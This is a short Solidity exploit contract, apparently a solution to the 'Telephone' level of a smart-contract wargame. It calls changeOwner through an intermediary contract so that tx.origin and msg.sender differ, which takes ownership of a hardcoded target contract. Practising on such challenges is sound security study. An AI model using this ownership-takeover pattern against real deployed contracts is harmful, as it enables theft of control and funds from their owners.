//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public challenge;

    constructor() {
        challenge = ITelephone(address(0x2fD0cA0e406CC76C8e74f78DA4F1A74038352417));
    }

    function attack() external payable {
        challenge.changeOwner(tx.origin);
    }

    receive() external payable {}
}